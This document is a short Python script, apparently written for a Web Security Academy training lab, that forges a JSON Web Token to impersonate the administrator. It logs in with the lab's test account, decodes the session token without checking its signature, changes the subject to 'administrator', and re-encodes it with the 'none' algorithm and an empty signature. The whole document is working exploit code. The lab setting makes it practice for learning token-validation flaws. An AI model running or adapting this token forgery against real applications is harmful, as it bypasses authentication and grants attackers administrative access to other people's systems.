import jwt
import json
import base64
import requests
from bs4 import BeautifulSoup

# Login & Get JWT Token

session = requests.Session()

url = "https://0aca00f603c6848a8014675500e8000b.web-security-academy.net/login"
response = session.get(url)

soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf_token,  
    "username": "wiener",
    "password": "peter"
}

response = session.post(url, data=data)

cookies = session.cookies.get_dict()
token = cookies.get("session")  
print(f"JWT Token: {token}\n")

# Payload

decoded_token = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token: {decoded_token}\n")

decoded_token['sub'] = 'administrator'
print(f"Modified payload: {decoded_token}\n")

payload_json = json.dumps(decoded_token, separators=(",", ":")).encode()

def b64_url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {"alg": "none", "typ": "JWT"}

header_encoded = b64_url_encode(json.dumps(header, separators=(",", ":")).encode())
payload_encoded = b64_url_encode(payload_json)

modified_token = f"{header_encoded}.{payload_encoded}."

print(f"Modified token: {modified_token}")